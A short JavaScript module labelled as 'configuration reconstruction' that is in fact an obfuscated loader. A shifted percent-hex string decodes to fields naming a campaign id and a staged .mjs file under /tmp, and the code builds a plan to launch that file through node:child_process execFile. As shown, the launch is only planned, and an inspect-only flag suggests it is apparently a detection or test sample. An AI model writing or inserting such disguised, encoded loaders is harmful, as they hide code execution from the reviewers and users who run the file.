// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_001ad375 = "%5e%25%19%64%5b%5c%4d%58%5b%25%54%57%4b%49%5c%4d%47%54%57%4b%49%54%14%4c%51%5b%58%49%5c%4b%50%47%58%5a%57%4b%4d%5b%5b%64%49%4c%49%58%5c%4d%5a%25%4d%60%4d%4b%4e%51%54%4d%47%56%57%4c%4d%64%5b%5c%49%4f%4d%47%4b%57%5d%56%5c%25%19%64%4b%49%55%58%49%51%4f%56%47%51%4c%25%36%37%2c%2d%15%1d%1b%2c%1e%29%1f%29%1c%64%4e%51%54%4d%47%58%49%5c%50%25%17%5c%55%58%17%50%5d%56%5c%5a%4d%5b%5b%15%56%57%4c%4d%17%16%5b%5c%49%4f%4d%15%1d%1b%4c%1e%49%1f%49%1c%4a%20%19%1e%16%55%52%5b";
const Codec_001ad375 = "percent_hex|subtract_modulo_256|18";

function load_001ad375() { return [...Material_001ad375.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_001ad375(storedBytes) { return storedBytes.map((value) => (value + 24) & 255); }
async function recover_001ad375() {
  const harmlessValue = 19 * 7 - 133;
  const storedBytes = load_001ad375(); let recoveredBytes = [];
  recoveredBytes = decode_001ad375(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_001ad375() { return Buffer.from(await recover_001ad375(), "utf8").toString("utf8"); }
async function plan_001ad375() { const inspect = inspect_001ad375; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_001ad375;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_001ad375());

// reconstruction complete